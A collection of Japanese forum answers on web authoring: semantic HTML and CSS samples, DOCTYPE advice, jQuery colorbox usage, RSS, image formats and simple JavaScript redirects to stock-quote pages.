申し訳ありませんが、ギリシャ文字を入力する具体的なソフトは存じません。 ただ、日本語を入力するための、かな漢字変換のソフトなども、日本語の入力に特化したものなので、同じようなものがあるとは思います。 ここでは、Windows 環境を想定して、とりあえず、入力と出力が可能な方法の一例を示します。 ・入力 　まず、ギリシャ文字をユニコードで編集可能なソフトが必要です。 　これに文字入力を行います。　 　もしも、ワード（あの、ワープロソフトです）で、最近のワードは対応しているようですから、 これが使えます。 　なければ、また、EmEditor ( http://jp.emeditor.com/ ) のうに、ユニコードに対応したエディタが使用可能と思います。 　文字入力の方法ですが、 http://homepage1.nifty.com/suzuri/000/pc6.html に情報がありました。 　このページにある方法が使えるのではないかと思います。 　 　特に、最後にある、IMEパッドから入力する という方法は、（マウスで一文字ずつ、文字をクリックする必要がありますが）文字を見ながら、入力可能です。 ・出力 　ここで編集したものを、数値文字参照形式に直す必要があります。 　探してみると、 HTMLCode http://www.vector.co.jp/soft/winnt/net/se483022. … 　が使えそうです。 　ワードに入力した後、HTML Code の上側のウインドウにこれをコピーした後、「10進変換」をクリックすると、数値文字参照形式に変換されたデータが得られます。 これで、編集はワード上で文字を見ながらできますから、少しは楽になるかと思います。
さらにその外側をborder=0のテーブルで囲ってしまえばよいと思います。
そりゃjQueryよりiFrameのほうが簡単に決まってるわｗｗｗ いちいち回答するほどの内容かよ。 （向き直って）質問者さんへ。 えー、 thickboxは作者が開発サポートを止めてしまっているので、もう使うべきではありません。 もう一方の人気プラグイン、fancyboxは商用利用が有償になったため、これも使いづらいし。。 残る定番となると、colorboxでしょうか。 これあたりを見てインストール http://tototo.grats.jp/jquery_colorbox/ $(要素).colorbox({オプション}); で、colorboxは開きますが、こういうurl固定の使用は「決め打ち」の場合の使い方で、今回の場合は、 var targetUrl; if( document.form1.q1[0].checked && document.form1.q2[0].checked && btn.name=='a') targetUrl = "./answer1.html"; // Called directly, without assignment to an element: // ＝要素にアサインせず、直に呼び出しするお $.colorbox({ href:targetUrl, 他オプション色々 }); これで一発かと。
HTMLにするより、XMLにするほうが楽ですよ。 RSS 1.0、RSS2.0、Atomの何れかのXMLにすればよいだけです。 RSS(XML)は人が読むための規格ではないのですが、XMLですので、スタイルシートXSLTなどでHTMLに変換すればよい。・・・RSSリーダーはどれにも対応している。 もともとの天気予報のフォーマットがわかりませんが、XHTMLでしたら苦もなくRSSフィードに変換できるはずです。
たぶん変更できないと思います。 管理画面　→　ショップ設定　→　決済フォームの管理　→　決済フォームの選択 この中にある項目から選ぶようなので変更できないようです。 　→　決済フォームの追加 を利用すれば独自の項目を追加できるようですが、日本語の表示は残ってしまうようなのでご希望のような変更はできないと思います。
No.3です。 ＞と言うように書きたい場合は 　この点は、誤りです!!。 「という風に表示したい」と考えるべきです。 　表示目的で<p>や<br>を使いわけるのではありません。---とても多くの方が誤解されています--- ★HTMLは文書構造をマークアップする物★ 　いう原則から、あなたの示されたサンプルの場合は、<li>りんご</li>が最適なマークアップでしょう。ひょっとすると、<dl><dt>果物</dt><dd>りんご</dd>のほうが良いかもしれません。 　実際にサンプルを示して起きます。こうマークアップされていれば、機械にも（検索エンジンにも）文書の構造が理解できます。 ★タブは＿に置換してあるので戻す。 ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　でチェック済みのHTML4.01です。 　印刷時には、スタイルは適用されません。 ★スタイルがあるときと無いとき(ブラウザの表示メニュー→[スタイルシート]から選択)を確認してみましょう。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css" media="screen"> <!-- body{font-size:16px;} div.section div.section{ width:600px;border:solid 1px gray; margin:20px auto;padding:10px; border-radius:5px;box-shadow:5px 5px 5px; line-height:1.6em; } div.section div.section *{margin:0;padding:0;} div.section div.section h3, div.section div.section dt{ font-weight:bold;font-size:16px; font-family:sans-serif; } div.section div.section ul, div.section div.section dl{ } div.section div.section li, div.section div.section dd+dd, div.section div.section span{ margin-left:3em; } li,dd,#section4 p span.name{margin-left:2em;list-style:none;padding-left:0;} #section4 p{font-size:0;line-height:0;} #section4 p span,#section4 p strong{ display:block;color:black;font-size:16px; line-height:1.6em;font-weight:normal; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>1)野菜と果物</h2> ＿＿<p>木(木本)になる果実は果物、草(草本)になるものは野菜です。一例を挙げると</p> ＿＿<div class="section" id="section1"> ＿＿＿<h3>果物</h3> ＿＿＿<p>木(木本)になる果実は果物です。</p> ＿＿＿<ul><!-- 順不同リスト --> ＿＿＿＿<li>りんご</li> ＿＿＿＿<li>バナナ</li> ＿＿＿＿<li>カキ</li> ＿＿＿</ul> ＿＿＿<h3>野菜</h3> ＿＿＿<p>草(草本)になるものは野菜です。</p> ＿＿＿<ul> ＿＿＿＿<li>イチゴ</li> ＿＿＿＿<li>スイカ</li> ＿＿＿＿<li>トマト</li> ＿＿＿</ul> ＿＿</div> ＿＿<div class="section" id="section2"> ＿＿＿<dl><!-- 定義リスト --> ＿＿＿＿<dt>果物</dt> ＿＿＿＿<dd>木(木本)になる果実は果物です。</dd> ＿＿＿＿<dd>りんご</dd> ＿＿＿＿<dd>バナナ</dd> ＿＿＿＿<dd>カキ</dd> ＿＿＿＿<dt>野菜</dt> ＿＿＿＿<dd>草(草本)になるものは野菜です。</dd> ＿＿＿＿<dd>イチゴ</dd> ＿＿＿＿<dd>スイカ</dd> ＿＿＿＿<dd>トマト</dd> ＿＿＿</dl> ＿＿</div> ＿＿<div class="section" id="section3"> ＿＿＿<dl><!-- 定義リスト --> ＿＿＿＿<dt>果物</dt> ＿＿＿＿<dd>木(木本)になる果実は果物です。 ＿＿＿＿＿<ul> ＿＿＿＿＿＿<li>りんご</li> ＿＿＿＿＿＿<li>バナナ</li> ＿＿＿＿＿＿<li>カキ</li> ＿＿＿＿＿</ul> ＿＿＿＿</dd> ＿＿＿＿<dt>野菜</dt> ＿＿＿＿<dd>草(草本)になるものは野菜です。 ＿＿＿＿＿<ul> ＿＿＿＿＿＿<li>イチゴ</li> ＿＿＿＿＿＿<li>スイカ</li> ＿＿＿＿＿＿<li>トマト</li> ＿＿＿＿＿</ul> ＿＿＿＿</dd> ＿＿＿</dl> ＿＿</div> ＿＿<div class="section" id="section4"> ＿＿＿<h3>果物</h3> ＿＿＿<p> ＿＿＿＿<strong>木(木本)になる果実は果物です。</strong><span class="name">りんご</span>、<span class="name">バナナ</span>、<span class="name">カキ</span>は果物です。 ＿＿＿</p> ＿＿＿<h3>野菜</h3> ＿＿＿<p> ＿＿＿＿<strong>草(草本)になるものは野菜です。</strong><span class="name">イチゴ</span>、<span class="name">スイカ</span>、<span class="name">トマト</span>は野菜です。 ＿＿＿</p> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
「SublimeText」と検索して出てくる情報で十分かと思います。まずはじめにすることは、STにPackage Controlをインストールして、簡単にプラグインを管理できるようにします。 あとはjsやphpのテスト環境を作るのであればcui版のphpとnode.jsをPCにインストールして各プログラムを実行(ビルド)できるようにします。 その他、Sassのコンパイル・補完やテーマの変更などお気に入りのプラグインをインストールして終了です。 私の環境(win7 64bit)だとキーバインドが衝突してるか何かで一部動かない場合がありました。
> アイフォンの最新OSが必要ですかね？ 必要、というわけではないです。 ただあると便利ですね。 個人的な感覚で申し訳ないですが、お客さんにはiPhoneユーザーが多く、特にデザイナーはこだわりが強いので「何故思った通りに表示されない」という文句を言ってくる人は大体がiPhoneで見てます。 そういう人に対し、「iPhoneはFlash見れないんで変わりの画像を載せてます」とか、「あなたの作ったデザインは、これこれこういう理由でiPhoneでは実現できないんですよ。もうちょっと勉強してからデザインしてね」とか説明するにはiPhoneを持ってると便利です。 アンドロイドユーザーの方は「自分の持っているものがスタンダードではない」と言う事を理解しているのであまり無理は言ってこない印象です。 > 話し合った結果を文章にして了解のサインをもらうべきなのですね。 そうですね。 ちょっとした更新とかでなく、サイト全体の作成やSEOなど、かかる期間や金額が大きいものに関しては メールの履歴程度ではなく必ず書面にして契約書を交わします。 メール自体も本来は法的効力はあるのですが、ゴネる人はゴネます。 契約書があるとゴネたくてもおとなしくなる人は多いです。
marginの指定で回避出来ますが・・ そもそも、そんなHTML書かないし・・・ <div class="nav"> 　<ul> 　　<li>あああああああ</li> 　　<li>いいいいいいい</li> 　　<li>ううううううう</li> 　　<li>えええええええ</li> 　　<li>おおおおおおお</li> 　</ul> </div> で必要十分じゃないかと、あるいは <ul class="nav"> 　<li>あああああああ</li> 　<li>いいいいいいい</li> 　<li>ううううううう</li> 　<li>えええええええ</li> 　<li>おおおおおおお</li> </ul> でもよい。画像はコンテンツの一部ではないと判断して書いていません。 　IDはリンクやjavascriptのターゲットになりますから、良いとして、class名は文書構造を示す物にしましょう。 　「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　class名には、HTML5で文書構造を示すために導入される新しい要素名( http://standards.mitsue.co.jp/resources/w3c/TR/h … )程度に抑えておきましょう。すなわち、header,section,footer,nav,aside,article,figure,・・・ 　HTMLも簡潔になりますし、10年後にメンテナンス使用とした時にすぐ分かる。 スタイルシートは、 /* 本文(section)中のnav(igation)なら */ div.section ul.nav{ width:650px;min-height:600px; margin:0 auto; padding: 20px; overflow:hidden; background:url(image.jpg) no-repeat 20px 20px; list-style-type: square; } な簡単なものだけですむ。 全文・・・・ ★画像はとりあえず300px×500pxで用意した。 ★タブは＿に置換してあるので戻す。 ★<DOCTYPE>はこう書かないと、ブラウザ間の誤差で悩まされる。 　⇒DOCTYPEスイッチ－HTMLの基本( http://www.htmq.com/htmlkihon/302.shtml ) ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　でチェッずみのHTML4.01strict+CSS2.1(ウェブ標準)です。 　HTML5にするときは、そのまま<div class="header"></div>→<header></header>とすればよい。section.nav,footerも同様 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- /* 本文(section)中のnav(igation)は */ div.section ul.nav{ width:650px;min-height:540px; margin:0 auto; padding: 20px; overflow:hidden; background:url(image.jpg) no-repeat 20px 20px; list-style-type: square; line-height:2em; } div.section ul.nav li{margin-left:320px;padding:0;} /* ヘッダー(header)中のnav(igation)は */ div.header ul.nav{ list-style:none;margin:0;padding:0; font-size:0.8em;text-align:center; } div.header ul.nav li{ display:inline-block; padding:0 2em; } /* こんなこともできる */ div.section ul.nav{position:relative;} div.section ul.nav li:hover:after{position:absolute;font-size:1em;content:"▼";color:red;} div.section ul.nav li:hover:after{left:20px;top:20px;} div.section ul.nav li+li:hover:after{left:60px;top:100px;} div.section ul.nav li+li+li:hover:after{left:120px;top:200px;} div.section ul.nav li+li+li+li:hover:after{left:220px;top:300px;} div.section ul.nav li+li+li+li+li:hover:after{left:100px;top:300px;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿＿<ul class="nav"><!-- 複数個所出てくるのでclass --> ＿＿＿<li>あああああああ</li> ＿＿＿<li>いいいいいいい</li> ＿＿＿<li>ううううううう</li> ＿＿＿<li>えええええええ</li> ＿＿＿<li>おおおおおおお</li> ＿＿</ul> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<ul class="nav"> ＿＿＿<li>あああああああ</li> ＿＿＿<li>いいいいいいい</li> ＿＿＿<li>ううううううう</li> ＿＿＿<li>えええええええ</li> ＿＿＿<li>おおおおおおお</li> ＿＿</ul> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
<!--[if lt IE 9]><![endif]--> じゃ無くて <!--[if lt IE]><![endif]--> そのまえに、HTML5として正しいか否かを 　⇒Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) でチェック
(チェック)　<link rel=“stylesheet” href=“style3.css”> ○　<link rel="stylesheet" href="style3.css">
質問の意味がわからないのですが、 ＞パソコンで表示するなら100％のサイズ、 ＞スマホで表示するなら200％のサイズ、 　だと画像サイズの横幅が640pxだとパソコンだと480pxでディスプレイの数分の一、スマホだったらはみ出すかしてしまう。スマホだったら自動縮小されるのでもっと複雑。 　普通にリキッドで製作するなり、CSS3のMedia Queriesを使ってスタイルシートを切り替えるのですが・・
＞私のサイトを見て、ググった時に表示するかどうかをチェックしに来てるのです か？ その通りです。 ご自身でGoogleのサイト登録を行った場合であっても、クローラ（Googleボット）が来て初めてキャッシュされ、インデックス登録がなされます。 また、キャッシュされた後も定期的にクロールは行われます。 逆にボットが来ないと、質問者様のサイトが更新されても、Google側のキャッシュはいつまでも古いままとなり、検索の精度が下がってしまいます。
＞ホームページのソースをご覧いただき、説明していただける方、よろしくお願いします。 　基本的なことは、 　⇒Another HTML Lint - Gateway ( http://www.htmllint.net/html-lint/htmllint.html ) ですべて教えてくれる。100点満点でないにしても、その近くにはしよう。 取り合えず、tableでデザインすることだけは止めましょう。 　⇒単に文書内容を整形する目的だけで表を用いるべきでない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　⇒ページレイアウトの目的で表を用いる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　1999年のHTML4.01の勧告以来、15年・・・いくらなんでも・・
>>10.9が使えて当分はOSのアップデートも行われるであろうものがですか？ それで少なくても3年以上確認できそうなら購入を検討します。 さあ、私も、Ｍａｃは詳しくないのでそういうことは何も判りません。 ご自身でヤフオクなどを調べてみてください。
＞上下にはいらないので、左右に指定します。 　左右じゃなく一方だけ指定すればよいです。 <div class="header"> 　<p>？？？？？？</p> 　<div class="nav"> 　　<ol> 　　　<li><a href=""></a></li> 　　　<li><a href=""></a></li> 　　　<li><a href=""></a></li> 　　　<li><a href=""></a></li> 　　</ol> 　</div> </div> ちなみに、[HTML5]だと <header> 　<p>？？？？？？</p> 　<nav> 　　<ol> 　　　<li><a href=""></a></li> 　　　<li><a href=""></a></li> 　　　<li><a href=""></a></li> 　　　<li><a href=""></a></li> 　　</ol> 　</nav> </header> の<li>要素をinline-blockで横並びにした後、最初の<LI>のみ左右につけたら、二つ目以降の<LI>はborder-width:0 1 0 0;で右側だけborderがつく。 [HTML4.01strict]サンプル ★タブは＿に置換してあるので戻す。 ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　でチェック済み <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- div.header div.nav ol,div.header div.nav ol li{ text-align:center;list-style:none;margin:0;padding0; font-size:0; line-height:26px; } div.header div.nav ol li{ display:inline-block; width:20%; font-size:16px; border:black solid; border-width:0 1px 0 1px; position:relative; } div.header div.nav ol li+li{ border-left-width:0; } div.header div.nav ol li a{ display:block; width:90%;height:100%;margin: 0 auto; text-decoration:none; background-color:rgb(240,240,240); overflow:hidden; position:relative; } div.header div.nav ol li a:hover{ background-color:red; text-indent:-20em; } div.header div.nav ol li a:hover:after{ display:block; position:absolute;top:0;left:0; text-indent:0; width:100%; } div.header div.nav ol li a[href="/"]:hover:after{content:"トップ";} div.header div.nav ol li a[href="/Products"]:hover:after{content:"製品";} div.header div.nav ol li a[href="/Manual"]:hover:after{content:"マニュアル";} div.header div.nav ol li a[href="/contact"]:hover:after{content:"問合せ";} --> </style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿＿<div class="header"> ＿＿＿<p>？？？？？？</p> ＿＿＿<div class="nav"> ＿＿＿＿<ol> ＿＿＿＿＿<li><a href="/">Top</a></li> ＿＿＿＿＿<li><a href="/Products">Products</a></li> ＿＿＿＿＿<li><a href="/Manual">Manual</a></li> ＿＿＿＿＿<li><a href="/contact">Contact</a></li> ＿＿＿＿</ol> ＿＿＿</div> ＿＿</div> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>・・・</p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
Webオーサリングツール( http://ja.wikipedia.org/wiki/Web%E3%82%AA%E3%83% … ) に関する質問だと思います。 ＞Excelで作成しHTMLに変換しています。 　これはさすがに論外です。Excelのその機能は、「Excelを持っていない人でもブラウザがあれば閲覧できる」ためのもので、ウェブに使えるようなものじゃないです。 ＞高度なものを使いこなせる技術もないので、簡単なものをよろしくお願いします。 　よく誤解されるのですが、ウェブは高速道路網みたいなものです。免許がなくても誰でも参加できますが、最低限の運転技術や標識の理解は必要です。 　Webオーサリングツールは、あくまでウェブページの製作を手助けしてくれるツールですが、HTMLやCSSの知識が無くても使いこなせるという物ではありません。お仕着せのテンプレートでままならない場合、ちょっと手を加えようとするとHTMLやCSSの知識--それもテキストエディタでゴリゴリかける人以上の知識とそのツールの扱い方や癖、短所の知識も必要になります。・・・HTMLやCSSの知識が無くても・・・なんていっているツールは信頼できません。そんなことありえない。 ＞DreamWaverやらホームページビルダーやらWebMatrixやら、Wordpress等々、 Dreamweaverやホームページビルダー、WebMatrixは、上記Webオーサリングツールですが、WordpressはCMSです。 　Dreamweaver、WebMatrixはHTML/CSS程度は知らないと手がつけられないでしょう。 ＞目的はWikipediaみたいな、左にメニュー、右に内容、ごくシンプルな物を作成したいのです。 　もちろんWikiを導入すれば良いですが、WikiもCMSです。Wordpressはブログ、Wikiはウィキシステムと差がありますが・・ 　いずれにしても、HTMLやCSSは最低限必要な知識です。それを身につけていくうちに、どんなツールが良いか決まっていくでしょう。
私は基本EmEditorで・・ 　⇒ブログテンプレート作り　CSSで困ったことが・・・ - ホームページ作成ソフト - 教えて！goo( http://oshiete.goo.ne.jp/qa/8455241.html ) 　の回答のようにHTML書きます。ブロック要素こどにタブひとつ・・短い<p></p>のように一目で見渡せる物は一行 　　　<p>ここは短い</p> 　　　<p> 　　　　ここ長い・・<span>行内要素</span>・・・ 　　　</p> とか統一しています。 　それが、書き変わる事はありません。
HTMLにしろCSSにしろ、最初は仕様書に目を通してから始めると良いです。 　⇒4.1.7 規則集合、宣言ブロック、セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　宣言ブロックは、左波括弧（{）で始まり、対応する右波括弧（}）で終わる。宣言の間には、ゼロ個以上のセミコロン（;）で区切られたリストが存在しなければならない。 　⇒4.1.8 宣言とプロパティ( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　宣言は、空であるか、もしくはプロパティ名の後にコロン（:）続くでプロパティ値で構成される。これらの前後に空白が出現してよい。 宣言を続けるときは必ず;セミコロンで区切ること!!
すでに回答しましたが・・それでIE7以降は改善されるはずですけど・・ 　⇒Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) ・DOCTYPE宣言がない!!　これが最初に忠告されるはず・・ ★ちゃんとDOCTYPE宣言をしましょう。 　そのときに、必ずstrictにして置きます。 『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　IEは、かって他のブラウザを蹴落とすために独自仕様でした(そのためIE用に作られたページ以外は崩れる) 　古いIE用を表示させる互換モー時を持っているた、IEに対して標準モードで動作させるように宣言する必要がある。 　対症療法な対処ではなく、きちんと対処しないとブラウザ間の誤差に随所で悩まされる ★body直下にtableはありえません。 　￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ 　tableは二次元データをあらわすもので、配置やデザインのためではありません。 ※これは、最低限守らないと!!! [サンプル] ★HTML4.01strict + CSS2.1 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- table[summary="サンプル"]{ width: 90%; margin: 0 auto; background-color:red; border:solid 10px blue; border-radius:15px; } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<table summary="サンプル"> ＿＿＿<tr> ＿＿＿＿<td>セル</td> ＿＿＿</tr> ＿＿</table> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2012-08-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2012-08-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
HTML5ではなく、CSS3・・・スタイルシートです。ただしウェブ標準とは違う。 スライドショー自体はjQuery使用してます。 CSS3のアニメーションは 　⇒CSS Animations( http://www.w3.org/TR/css3-animations/ ) 時間的変化は 　⇒CSS Transitions( http://www.w3.org/TR/css3-transitions/ )
テキストボックス入力後にEnterを押すと、新しいタブ(またはウィンドウ)でサイト1を開くようにしました。 <html> <head> <script type="text/javascript"> <!-- function jump1(){ window.open("http://minkabu.jp/stock/" + document.getElementsByName("code1")[0].value,"_blank"); } function jump2(){ window.open("http://kabu-sokuhou.com/brand/item/code___" + document.getElementsByName("code2")[0].value,"_blank"); } //--> </script> <base target="main"> </head> <body> <form onsubmit="jump1();return false;"> <input name="code1" size="4"> <br><br> <input type="submit" value="サイト１へ"> </form> <form> <input type="hidden" name="code2" size="4"> <input type="button" onclick="jump2()" value="サイト２へ"> </form> </body> </html>
エラーですから、勿論良いわけはありません。EHINBHQBMJQNTさんの確認ブラウザでは、改行の数だけ空間が空いているのでしょうが、ぶらうざによっては、改行１回分と同じと解釈するブラウザもあります。エラーとはその処理がブラウザによってまちまちとなります。 連続<br>はたくさん改行したいのではなく、改行は１回でいいが、見た目で間隔を開けたいのではないですか？ それならもはや改行ではなく、段落が違うので、<br>ではな<p>で別の段落（要素）になるのではないかと。 <p>あああああああああ</p> <p>いいいいいいいいいいい</p> それでもっともっと、見た目を離したいという場合には、cssを使います。推奨は別ファイルにするｃｓｓですが、今回はすぐに試せる、インラインスタイルシートで記述します。 <p>あああああああああ</p> <p style="margin-top:10em;">いいいいいいいいいいい</p> style="～"インラインスタイルシートと解釈します。 中身は「プロパティ（何を）:値（どうする）」で、;を挟むことにより、複数記述できます。 今回は、上部の他の要素との空間を１０文字分空ける。という意味になります。 <p>あああああああああ</p> <p style="padding-top:10em;">いいいいいいいいいいい</p> でも今回の話しだと、いいと思います。 pでなく、他の要素でも同じです。 <div style="padding-top:10em;">いいいいいいいいいいい</div> という感じです。
日本語で構いません。 ただ、属性セレクタで日本語を使うとブラウザによってうまく行かない恐れが・・ table[summary="テスト"]{border:solid 2px red;} としたときに、文字コードと不整合だった場合ブラウザが理解できない。 そこさえ間違わなければ、構いません。 　⇒summary = text [CS] ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
まず拡張子はただの名前なので、「拡張子を変える」のは無意味です。 画像形式を変えることを言っているのでしょうけれど。 また、今あるjpgファイルをそのままpngに変換するのは、画質が変わらずファイルサイズが増えるので、悪影響しかありません。 あくまで新たに作るファイルをjpgにするかpngにするかという観点で答えます。 pngの(jpgに対する)利点としては、無劣化であることが一番大きいと思います。 特に、線画や文字はjpgでは劣化が激しいのでpngがお勧めです。 逆にjpgの利点は、どんな画像でもそれなりのファイルサイズに収まることです。 pngはファイルサイズの幅が広く、単純な線画や文字だけのファイルならjpgより軽いですが、例えばデジカメで撮った写真をpngに変換すると恐ろしいファイルサイズになります。 なおNo1さんのサイトの内容はまあ大体合っていますが、pngが古いブラウザで使えないという点だけは、10年くらい前の話なので現在全く気にすることはありません。
自分でルールを決めておきましょう。 私は、ブロック要素はタブ・・ <body> - - <div class="header"> - - - - <h1>タイトル</h1> - - - - <div class="abstract"> - - - - - - <h2>抄録</h2> - - - - - - <p> - - - - - - - - このページでは、・・・・ - - - - - - </p> - - - - - - <p> - - - - - - - - このページでは、・・・・ - - - - - - </p> - - - -</div> - - </div> - - <div class="section"> - - - - <h2>本文</h2> - - - - - - <p> - - - - - - - - このページでは、・・・・ - - - - - - </p> 連続したタブや改行、半角スペースは「ユーザエージェントは、語間スペースの出力処理に際しては、連続する空白類の入力があった場合は1つにまとめてしまう必要がある。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」から、ソースが見やすいように改行、タブ、半角スペースでインデントさせると良いでしょう。 ※きちんと開始タグでインデント、閉じタグでインデント解除 ※むやみやたらと<DIV>を使わない。使うときは 　『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　なのですから、今何処にいるかもわかるはず ※よいテキストエディタを使用する。 　私のEmEditorだと、添付のように何処までがその開始タグかわかる。 ★基本は、タグごとにインデントさせること ★むやみにDIVなど使わないこと。 　
<html> <head> <script type="text/javascript"> <!-- function jump(){ location.href="http://minkabu.jp/stock/" + document.getElementsByName("code")[0].value; } //--> </script> </head> <body> <form> <input type="text" name="code"> <input type="button" onclick="jump()" value="移動する"> </form> </body> </html>
その指定は、その記述があるファイル自体についてのものです。 サーバーは無関係です。 UTF-8で保存したHTMLで、charset=EUC-JP だったら、文字化けするでしょう。
こちらを読んでおかれると良いでしょう。 簡単に説明できる内容じゃないので・・・ 　⇒Standard Generalized Markup Language - Wikipedia ( http://ja.wikipedia.org/wiki/SGML ) 　⇒マークアップ言語 - Wikipedia ( http://ja.wikipedia.org/wiki/%E3%83%9E%E3%83%BC% … )
そのファイルから正しい相対位置を書いていますか？
一般的には「難読化」と呼ばれるものの一つですが、 ファイルサイズを小さくすることのみが目的なら、「ソースコード圧縮」とか言う方がいいのかも。
＞現状　グレーの横線が入っており　 　　その横線をフリースペースの上下に配置して　 　　そのフリースペースに　728x90pxの広告を 　　貼り付けたいのです。 次の指定ではどうですか？。 　　　　　　P.partition { 　　　　　　　　height: 90px; 　　　　　　　　width: 728px; 　　　　　　　　margin: 0 0 10px; 　　　　　　　　border-top: 10px solid #ccc; 　　　　　　　　border-bottom: 10px solid #ccc; 　　　　　　　　background-image: url("広告の画像のURL"); 　　　　　　}
